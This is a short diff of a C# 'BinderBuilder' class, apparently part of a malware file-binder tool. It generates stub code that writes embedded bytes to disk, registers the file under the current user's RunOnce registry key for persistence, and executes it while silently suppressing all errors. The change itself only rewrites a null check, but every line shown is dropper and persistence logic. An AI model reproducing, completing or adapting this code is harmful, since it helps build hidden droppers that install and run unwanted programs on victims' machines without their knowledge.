@@ -143,7 +143,7 @@ public static class BinderBuilder
         sb.AppendLine("            string p=Path.Combine(t,name);");
         sb.AppendLine("            File.WriteAllBytes(p,b);");
         if (anyRunOnce)
-            sb.AppendLine("            if(ro)try{var k=Registry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true);k?.SetValue(name,\"\\\"\" +p+ \"\\\"\");k?.Dispose();}catch{}");
+            sb.AppendLine("            if(ro)try{var k=Registry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true);if(k!=null){k.SetValue(name,\"\\\"\" +p+ \"\\\"\");k.Dispose();}}catch{}");
         sb.AppendLine("            Process.Start(new ProcessStartInfo(p){UseShellExecute=true});");
         sb.AppendLine("        }catch{}");
         sb.AppendLine("    }");
